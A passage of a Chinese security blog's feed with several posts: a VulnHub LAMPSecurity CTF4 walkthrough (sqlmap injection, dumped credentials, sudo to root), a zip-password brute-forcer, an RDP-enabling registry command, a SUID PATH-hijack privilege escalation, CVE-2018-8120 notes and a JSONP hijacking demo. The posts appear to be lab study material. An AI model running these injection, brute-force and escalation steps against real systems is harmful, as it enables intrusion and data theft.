<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/2.png" alt></li>
<li>开启22、25、80</li>
<li>访问80</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/3.png" alt></li>
<li>各种翻，找到mysql错误信息</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/4.png" alt></li>
<li>sqlmap跑：sqlmap -u “<a href="http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;" target="_blank" rel="noopener">http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;</a> –dbs –batch</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/5.png" alt></li>
<li>枚举所有数据库里的数据表</li>
<li>sqlmap -u “<a href="http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;" target="_blank" rel="noopener">http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;</a> -D ehks –tables –dump</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/6.png" alt></li>
<li>sqlmap -u “<a href="http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;" target="_blank" rel="noopener">http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;</a> -D ehks -T user –dump</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/7.png" alt></li>
<li>使用其中一个用户来登录，如第一个dstevens，ilike2surf</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/8.png" alt></li>
<li>登录成功</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/9.png" alt></li>
<li>直接sudo su，输入密码，升到root权限</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/10.png" alt></li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>python小脚本</title>
    <url>/python%E5%B0%8F%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="0x01-小脚本处理-pcapng文件"><a href="#0x01-小脚本处理-pcapng文件" class="headerlink" title="0x01 小脚本处理.pcapng文件"></a>0x01 小脚本处理.pcapng文件</h2><ol>
<li>关键字：DNS、多重base</li>
<li><img src="/python%E5%B0%8F%E8%84%9A%E6%9C%AC/1.png" alt><pre><code>a=[]
with open(&quot;1.pcapng&quot;,&quot;rb&quot;) as file1:
 data=file1.read()
 flag=&#39;F=&quot;&#39;
 while True:
     try:
         start=data.index(flag)+len(flag)
         data=data[start:]
         end=data.index(&#39;&quot;&#39;)
         a.append(data[:end])
     except:
         break
with open(&quot;1.txt&quot;,&quot;w&quot;) as file2:
 file2.write(&quot;&quot;.join([a[i]+&quot;\n&quot; for i in range(len(a))]))</code></pre></li>
</ol>
<h2 id="0x02-zipfile爆破zip文件"><a href="#0x02-zipfile爆破zip文件" class="headerlink" title="0x02 zipfile爆破zip文件"></a>0x02 zipfile爆破zip文件</h2><pre><code>#coding:utf-8
import zipfile
import threading

def zipbp(zfile,pwd):
    try:
        zfile.extractall(pwd=pwd)  #密码解压
        print &#39;password is: %s&#39;%pwd
    except:
        return

def main():
    zfile=zipfile.ZipFile(&#39;1.zip&#39;)  #用于读取zip文件
    pwdall=open(&#39;pass.txt&#39;)  #读字典
    for pwd in pwdall.readlines():  #读字典的每行
        pwd=pwd.strip(&#39;\n&#39;)  #去掉换行符
        t=threading.Thread(target=zipbp,args=(zfile,pwd))  #多线程爆破
        t.start()  #启动线程

if __name__ == &#39;__main__&#39;:
    main()</code></pre><pre><code>#coding:utf-8
import zipfile
import threading
import optparse

def zipbp(zfile,pwd):
    try:
        zfile.extractall(pwd=pwd)  #密码解压
        print &quot;password is: %s&quot;%pwd
    except:
        return

def main():
    parser=optparse.OptionParser(&quot;Usage : python %prog -f &lt;zipfile&gt; -d &lt;dictionary&gt;&quot;)
    parser.add_option(&#39;-f&#39;,dest=&#39;zip_name&#39;,type=&#39;string&#39;,help=&#39;zip file&#39;)
    parser.add_option(&#39;-d&#39;,dest=&#39;dictionary_name&#39;,type=&#39;string&#39;,help=&#39;dictionary file&#39;)
    options,args=parser.parse_args()
    if options.zip_name is None or options.dictionary_name is None:
        print parser.usage 
        exit(0)
    else:
        zip_name=options.zip_name
        dictionary_name=options.dictionary_name

    zfile=zipfile.ZipFile(zip_name)  #用于读取zip文件
    pwdall=open(dictionary_name)  #读字典
    for pwd in pwdall.readlines():  #读字典的每行
        pwd=pwd.strip(&#39;\n&#39;)  #去掉换行符
        t=threading.Thread(target=zipbp,args=(zfile,pwd))  #多线程爆破
        t.start()  #启动线程


if __name__ == &#39;__main__&#39;:
    main()</code></pre>]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透之windows</title>
    <url>/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/</url>
    <content><![CDATA[<h2 id="0x00-未整理"><a href="#0x00-未整理" class="headerlink" title="0x00 未整理"></a>0x00 未整理</h2><p>开3389<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
<p>读管理员密码<br>创建用户，添加到管理员权限</p>
<p>建隧道</p>
<p>CS</p>
]]></content>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>提权之Linux-利用通配符本地提权</title>
    <url>/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="0x00-通配符"><a href="#0x00-通配符" class="headerlink" title="0x00 通配符"></a>0x00 通配符</h2><ol>
<li>常见通配符：*、?、+、[]、-、~</li>
<li>主要用来对关键字进行模糊匹配。</li>
<li>在终端里，输入的通配符是shell处理的，shell会将其当作路径或文件名去查找，存在则处理。</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/1.png" alt></li>
</ol>
<h2 id="0x01-通配符野性"><a href="#0x01-通配符野性" class="headerlink" title="0x01 通配符野性"></a>0x01 通配符野性</h2><ol>
<li>命令：</li>
<li>echo “123”&gt;–help</li>
<li>ls -l</li>
<li>cat ./–help</li>
<li>cat –help #读取不了–help文件的内容，而是输出了cat的help选项，称为通配符野性</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/2.png" alt></li>
</ol>
<h2 id="0x02-利用chown劫持文件所有者"><a href="#0x02-利用chown劫持文件所有者" class="headerlink" title="0x02 利用chown劫持文件所有者"></a>0x02 利用chown劫持文件所有者</h2><ol>
<li>Linux是多用户多任务操作系统，所有文件都有拥有者。</li>
<li>chown命令可改变文件的拥有者为指定的用户或组，用户可以是用户名或用户ID，组可以是组名或组ID。</li>
<li>将test.txt文件</li>
</ol>
]]></content>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>提权之windows-CVE-2018-8120</title>
    <url>/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/</url>
    <content><![CDATA[<h2 id="0x00-漏洞原因"><a href="#0x00-漏洞原因" class="headerlink" title="0x00 漏洞原因"></a>0x00 漏洞原因</h2><ol>
<li>部分版本Windows系统win32k.sys组件的NtUserSetImeInfoEx()系统服务函数内部未验证内核对象中的空指针对象,普通应用程序可利用该空指针漏洞以内核权限执行任意代码。</li>
</ol>
<h2 id="0x01-受影响版本"><a href="#0x01-受影响版本" class="headerlink" title="0x01 受影响版本"></a>0x01 受影响版本</h2><ol>
<li>Win2003 x32,Win2003 x64</li>
<li>Win7 x32, Win7 x64 企业版</li>
<li>Win2008 x32</li>
<li>Win2008 R2 x32</li>
<li>Win2008 R2 Datacenter x64</li>
<li>Win2008 Enterprise x64 </li>
<li>WinXP x32</li>
</ol>
<h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><ol>
<li><a href="https://github.com/unamer/CVE-2018-8120" target="_blank" rel="noopener">https://github.com/unamer/CVE-2018-8120</a></li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/1.png" alt="安全自鉴"></li>
</ol>
<h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><ol>
<li><p>Win 2008 R2 Enterprise x64 （提权失败~，版本不在影响范围）</p>
</li>
<li><p><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/2.png" alt></p>
</li>
<li><p>win 7 x64 旗舰版（提权失败~，版本不在影响范围）</p>
</li>
<li><p><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/4.png" alt></p>
</li>
<li><p>win 2003 x64 Enterprise（提权成功）</p>
</li>
<li><p><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/3.png" alt></p>
</li>
</ol>
<h2 id="0x04-微软修复程序下载地址"><a href="#0x04-微软修复程序下载地址" class="headerlink" title="0x04 微软修复程序下载地址"></a>0x04 微软修复程序下载地址</h2><ol>
<li><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120</a></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://xiaodaozhi.com/exploit/156.html" target="_blank" rel="noopener">https://xiaodaozhi.com/exploit/156.html</a></li>
</ol>
]]></content>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>提权之Linux-环境变量</title>
    <url>/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h2 id="0x00-环境变量"><a href="#0x00-环境变量" class="headerlink" title="0x00 环境变量"></a>0x00 环境变量</h2><ol>
<li>环境变量是用来定义系统运行环境的一些参数。</li>
<li>env #查看环境变量命令</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/1.png" alt></li>
<li>echo $PATH #输出单项环境变量</li>
<li><strong>比较重要的10个环境变量</strong></li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/2.png" alt></li>
</ol>
<h2 id="0x01-新建测试文件"><a href="#0x01-新建测试文件" class="headerlink" title="0x01 新建测试文件"></a>0x01 新建测试文件</h2><ol>
<li>新建test.c，内容<pre><code>#include &lt;unistd.h&gt;
void main()
{
     setuid(0);
     setgid(0);
     system(&quot;ps&quot;);
}</code></pre></li>
<li>编译test.c，赋权</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/3.png" alt></li>
<li>chmod u+s [exe] #u+s：让某用户在执行该可执行文件时暂时拥有该文件所有者的权限</li>
</ol>
<h2 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h2><ol>
<li>find / -perm -u=s -type f 2&gt;/dev/null #查找/（根）目录下，权限u为s（rws），类型为文件，即枚举所有符合条件的可执行文件</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/4.png" alt></li>
<li>找到test执行文件具有SUID权限</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/5.png" alt></li>
</ol>
<p><strong>echo命令</strong></p>
<pre><code>test@linux:/tmp$ echo &quot;/bin/bash&quot;&gt;ps
test@linux:/tmp$ ls
ps  test  test.c
test@linux:/tmp$ chmod 777 ps
test@linux:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
test@linux:/tmp$ export PATH=/tmp:$PATH #export：添加临时环境变量
test@linux:/tmp$ ls
ps  test  test.c
test@linux:/tmp$ ./test
root@linux:/tmp# id</code></pre><ol>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/6.png" alt></li>
<li>#export：添加临时环境变量</li>
<li>永久修改环境变量</li>
<li>编辑：vi /etc/profile</li>
<li>添加export PATH=$PATH:/usr/local/openresty/bin到文件末尾</li>
<li>使其生效：source /etc/profile</li>
</ol>
<p><strong>copy命令</strong></p>
<pre><code>test@linux:/tmp$ ls
test  test.c
test@linux:/tmp$ cp /bin/bash /tmp/ps
test@linux:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
test@linux:/tmp$ export PATH=/tmp:$PATH #其实已经添加了，这里是完整步骤
test@linux:/tmp$ ./test
root@linux:/tmp# whoami
root
root@linux:/tmp# </code></pre><ol>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/7.png" alt></li>
</ol>
<p><strong>symlink命令</strong></p>
<pre><code>ln -s /bin/bash ps
export PATH=/tmp:$PATH
./test
whoami</code></pre><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><pre><code>#include &lt;unistd.h&gt;
void main()
{
        setuid(0);
        setgid(0);
        system(&quot;ps&quot;);
}</code></pre><ol>
<li>执行命令为ps，可换成其他带SUID权限可执行的命令</li>
<li>id</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/8.png" alt></li>
<li>whoami</li>
<li>pwd</li>
<li>cat /etc/passwd</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li>
</ol>
]]></content>
      <tags>
        <tag>提权</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF之隐写术</title>
    <url>/CTF%E4%B9%8B%E9%9A%90%E5%86%99%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="0x00-隐写术"><a href="#0x00-隐写术" class="headerlink" title="0x00 隐写术"></a>0x00 隐写术</h2><ol>
<li>隐写术（Steganography）：一门关于信息隐藏的技巧与科学。所谓信息隐藏指的是不让除预期的接收者之外的任何人获取到信息的内容。</li>
</ol>
<h2 id="0x10-PNG"><a href="#0x10-PNG" class="headerlink" title="0x10 PNG"></a>0x10 PNG</h2><ol>
<li>图片隐写术：信息隐藏在图片中，不仅不会影响图片的正常浏览，通过网络上传下载，经过特定的方式解密，还能还原原隐藏的明文信息。</li>
</ol>
<h2 id="0x11-PNG文件格式分析"><a href="#0x11-PNG文件格式分析" class="headerlink" title="0x11 PNG文件格式分析"></a>0x11 PNG文件格式分析</h2><ol>
<li></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/</a></li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>python与编码解码</title>
    <url>/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/</url>
    <content><![CDATA[<h2 id="0x00-python2-和-python3"><a href="#0x00-python2-和-python3" class="headerlink" title="0x00 python2 和 python3"></a>0x00 python2 和 python3</h2><ol>
<li>python2和python3</li>
<li>获取当前系统不同Python版本的默认编码</li>
<li>import sys</li>
<li>sys.getdefaultencoding() 或 sys.getfilesystemencoding()</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/13.png" alt></li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/14.png" alt></li>
<li>获取默认的区域设置</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/15.png" alt></li>
</ol>
<h3 id="0x01-相关内置函数"><a href="#0x01-相关内置函数" class="headerlink" title="0x01 相关内置函数"></a>0x01 相关内置函数</h3><ol>
<li>chr() #把整型int转换为ascii型</li>
<li>ord() #把ascii型转换为整型int</li>
<li>hex() #把相关进制转换为16进制</li>
<li>oct() #把相关进制转换为8进制</li>
<li>bin() #把相关进制转换为2进制</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/21.png" alt></li>
</ol>
<h2 id="0x10-进制家族"><a href="#0x10-进制家族" class="headerlink" title="0x10 进制家族"></a>0x10 进制家族</h2><h3 id="0x11-二进制"><a href="#0x11-二进制" class="headerlink" title="0x11 二进制"></a>0x11 二进制</h3><ol>
<li>2进制转8进制</li>
<li>oct(0b1100)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/2.png" alt></li>
<li>2进制转10进制</li>
<li>int(‘1100’,2)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/1.png" alt></li>
<li>2进制转16进制</li>
<li>hex(0b1100)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/3.png" alt></li>
</ol>
<h3 id="0x12-八进制"><a href="#0x12-八进制" class="headerlink" title="0x12 八进制"></a>0x12 八进制</h3><ol>
<li>8进制转2进制</li>
<li>bin(0o12)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/4.png" alt></li>
<li>8进制转10进制</li>
<li>int(0o12)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/5.png" alt></li>
<li>8进制转16进制</li>
<li>hex(0o12)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/6.png" alt></li>
</ol>
<h3 id="0x13-十进制"><a href="#0x13-十进制" class="headerlink" title="0x13 十进制"></a>0x13 十进制</h3><ol>
<li>10进制转2进制</li>
<li>bin(14)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/7.png" alt></li>
<li>10进制转8进制</li>
<li>oct(14)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/8.png" alt></li>
<li>10进制转16进制</li>
<li>hex(14)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/9.png" alt></li>
</ol>
<h3 id="0x14-十六进制"><a href="#0x14-十六进制" class="headerlink" title="0x14 十六进制"></a>0x14 十六进制</h3><ol>
<li>16进制转2进制</li>
<li>bin(0xf)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/10.png" alt></li>
<li>16进制转8进制</li>
<li>oct(0xf)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/11.png" alt></li>
<li>16进制转10进制</li>
<li>int(0xf)</li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/12.png" alt></li>
</ol>
<h3 id="0x15-相关在线工具进制转换"><a href="#0x15-相关在线工具进制转换" class="headerlink" title="0x15 相关在线工具进制转换"></a>0x15 相关在线工具进制转换</h3><ol>
<li><a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener">https://tool.lu/hexconvert/</a></li>
<li><a href="https://tool.oschina.net/hexconvert/" target="_blank" rel="noopener">https://tool.oschina.net/hexconvert/</a></li>
</ol>
<h2 id="0x20-base家族"><a href="#0x20-base家族" class="headerlink" title="0x20 base家族"></a>0x20 base家族</h2><ol>
<li>模块：<a href="https://github.com/python/cpython/blob/3.8/Lib/base64.py" target="_blank" rel="noopener">base64</a><pre><code>#python2
#coding:utf-8
import base64
def start():
 #s=input(&#39;string: &#39;)   #正常字符串输入：&quot;python2&quot;，直接输入python2会报错
 #s=s.encode(&#39;utf-8&#39;)   #python3中字符都为unicode编码，而b64encode函数的参数为byte类型，
     #所以必须先转码，否则报错return binascii.hexlify(s).upper()，
     #TypeError: a bytes-like object is required, not &#39;str&#39;
 s=raw_input(&#39;input string: &#39;)  #所有输入都作为字符串
 print &#39;1. b16_encode\n&#39;
 print &#39;2. b16_decode\n&#39;
 print &#39;3. b32_encode\n&#39;
 print &#39;4. b32_decode\n&#39;
 print &#39;5. b64_encode\n&#39;
 print &#39;6. b64_decode\n&#39;
 print &#39;7. current string\n&#39;
 num(s)
def num(s):
 n=input(&#39;number(1-6 , 0 exit): &#39;)
 if n&gt;0 and n&lt;8:
     t=base64encode_decode(n,s)
     num(t)
 else:
     exit()
def base64encode_decode(n,s):    
 if n==1:
     s_b16encode=base64.b16encode(s)
     print s_b16encode
     return s_b16encode
 elif n==2:
     s_b16decode=base64.b16decode(s)
     print s_b16decode
     return s_b16decode
 elif n==3:
     s_b32encode=base64.b32encode(s)
     print s_b32encode
     return s_b32encode
 elif n==4:
     s_b32decode=base64.b32decode(s)
     print s_b32decode
     return s_b32decode
 elif n==5:
     s_b64encode=base64.b64encode(s)
     print s_b64encode
     return s_b64encode
 elif n==6:
     s_b64decode=base64.b64decode(s)
     print s_b64decode
     return s_b64decode
 elif n==7:
     print s
     return s
 else:
     print &#39;only 1-6&#39;
if __name__ == &#39;__main__&#39;:
 start()</code></pre></li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/19.png" alt></li>
<li><strong>去掉编码前的b</strong></li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/20.png" alt></li>
</ol>
<h3 id="0x21-base编码序列在线工具"><a href="#0x21-base编码序列在线工具" class="headerlink" title="0x21 base编码序列在线工具"></a>0x21 base编码序列在线工具</h3><ol>
<li><a href="https://www.qqxiuzi.cn/bianma/base64.htm" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/base64.htm</a></li>
</ol>
<h2 id="0x30-binascii模块"><a href="#0x30-binascii模块" class="headerlink" title="0x30 binascii模块"></a>0x30 binascii模块</h2><pre><code>import binascii

str=&#39;python3&#39;
str_hex=str.encode(&#39;utf-8&#39;)
print(binascii.b2a_hex(str_hex))</code></pre><ol>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/22.png" alt></li>
</ol>
<h2 id="0x40-uuencode-amp-amp-uudecode"><a href="#0x40-uuencode-amp-amp-uudecode" class="headerlink" title="0x40 uuencode &amp;&amp; uudecode"></a>0x40 uuencode &amp;&amp; uudecode</h2><ol>
<li><a href="https://github.com/python/cpython/blob/master/Lib/uu.py" target="_blank" rel="noopener">uu模块</a></li>
<li><strong>uuencode.py</strong><pre><code>#coding:utf-8
import uu
with open(&#39;1.txt&#39;,&#39;rb&#39;) as in_file,open(&#39;2.txt&#39;,&#39;wb&#39;) as out_file:
 uu.encode(in_file,out_file)</code></pre></li>
<li><strong>1.txt</strong><pre><code>python2</code></pre></li>
<li><strong>2.txt</strong></li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/16.png" alt></li>
<li><strong>uudecode.py</strong><pre><code>#coding:utf-8
import uu
with open(&#39;2.txt&#39;,&#39;rb&#39;) as in_file:   
 uu.decode(in_file)   #直接输出或输出到文件 ,out_file)  如 ,&#39;3.txt&#39;) </code></pre></li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/18.png" alt></li>
<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/17.png" alt></li>
</ol>
<h3 id="0x41-一些在线编码解码工具"><a href="#0x41-一些在线编码解码工具" class="headerlink" title="0x41 一些在线编码解码工具"></a>0x41 一些在线编码解码工具</h3><ol>
<li><a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">http://web.chacuo.net/charsetuuencode</a></li>
<li><a href="http://www.mxcz.net/tools/uuencode.aspx" target="_blank" rel="noopener">http://www.mxcz.net/tools/uuencode.aspx</a></li>
<li><a href="https://www.qqxiuzi.cn/bianma/uuencode.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/uuencode.php</a></li>
</ol>
<h3 id="0x42-uu模块相关参考"><a href="#0x42-uu模块相关参考" class="headerlink" title="0x42 uu模块相关参考"></a>0x42 uu模块相关参考</h3><ol>
<li><a href="https://docs.python.org/zh-cn/2.7/library/uu.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/2.7/library/uu.html</a></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
        <tag>encode_decode</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON劫持攻击</title>
    <url>/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="0x00-JSON劫持"><a href="#0x00-JSON劫持" class="headerlink" title="0x00 JSON劫持"></a>0x00 JSON劫持</h2><ol>
<li>JSON劫持（JSON Hijacking）</li>
<li><strong>漏洞危害：</strong></li>
<li>可能用户权限被盗用</li>
<li>可能通过劫持对网页挂马</li>
<li>可能对劫持页面进行网站钓鱼</li>
<li>可能被拒绝服务攻击</li>
<li>可能提权攻击</li>
</ol>
<h2 id="0x01-JSON"><a href="#0x01-JSON" class="headerlink" title="0x01 JSON"></a>0x01 JSON</h2><ol>
<li><p>JSON：javascript object notation（javascript对象表示法），一种轻量级的数据交换格式。没有复杂的语法，通过重载大括号{}操作符的含义来实现（原本大括号代表的是代码块的分界，多条语句的集合）。</p>
</li>
<li><p>一个正确的大括号用作表达式的例子：</p>
</li>
<li><p><strong>test.json</strong></p>
<pre><code>var test_object={
 &quot;name&quot;:&quot;AAA&quot;,
 &quot;age&quot;:&quot;20&quot;,
 &quot;id&quot;:&quot;123&quot;,
 &quot;phone&quot;:&quot;13012345678&quot;
};
alert(test_object.name);</code></pre><p><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/1.png" alt></p>
</li>
<li><p><strong>JSON.html</strong></p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
 &lt;head&gt;
     &lt;meta charset=&quot;utf-8&quot;&gt;
     &lt;title&gt;JSON&lt;/title&gt;
 &lt;/head&gt;

 &lt;body&gt;
     &lt;script type=&quot;text/javascript&quot; src=&quot;http://192.168.100.5/test.json&quot;&gt;&lt;/script&gt;
 &lt;/body&gt;
&lt;/html&gt;</code></pre></li>
<li><p><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/2.png" alt></p>
</li>
</ol>
<h2 id="0x02-JSON劫持攻击"><a href="#0x02-JSON劫持攻击" class="headerlink" title="0x02 JSON劫持攻击"></a>0x02 JSON劫持攻击</h2><ol>
<li><p>假设用户AAA成功登录之后，返回一串JSON格式的用户信息，如</p>
</li>
<li><p>AAA({“data”:{“name”:”AAA”,”age”:”20”,”id”:”123”,”phone”:”13012345678”}});</p>
<pre><code>&lt;?php
$info=$_GET[&#39;info&#39;];
print $info.&#39;({&quot;data&quot;:{&quot;name&quot;:&quot;AAA&quot;,&quot;age&quot;:&quot;20&quot;,&quot;id&quot;:&quot;123&quot;,&quot;phone&quot;:&quot;13012345678&quot;}})&#39;;
?&gt;</code></pre></li>
<li><p><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/4.png" alt></p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
 &lt;head&gt;
     &lt;meta charset=&quot;utf-8&quot;&gt;
     &lt;title&gt;JSON&lt;/title&gt;
     &lt;script&gt;
         function AAA(user){
             alert(user.data.phone);
         }
     &lt;/script&gt;
 &lt;/head&gt;

 &lt;body&gt;
     &lt;script type=&quot;text/javascript&quot; src=&quot;http://192.168.100.5/test.php?info=AAA&quot;&gt;&lt;/script&gt;
 &lt;/body&gt;
&lt;/html&gt;</code></pre></li>
<li><p><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/3.png" alt></p>
</li>
<li><p>例子成功获取用户信息</p>
</li>
</ol>
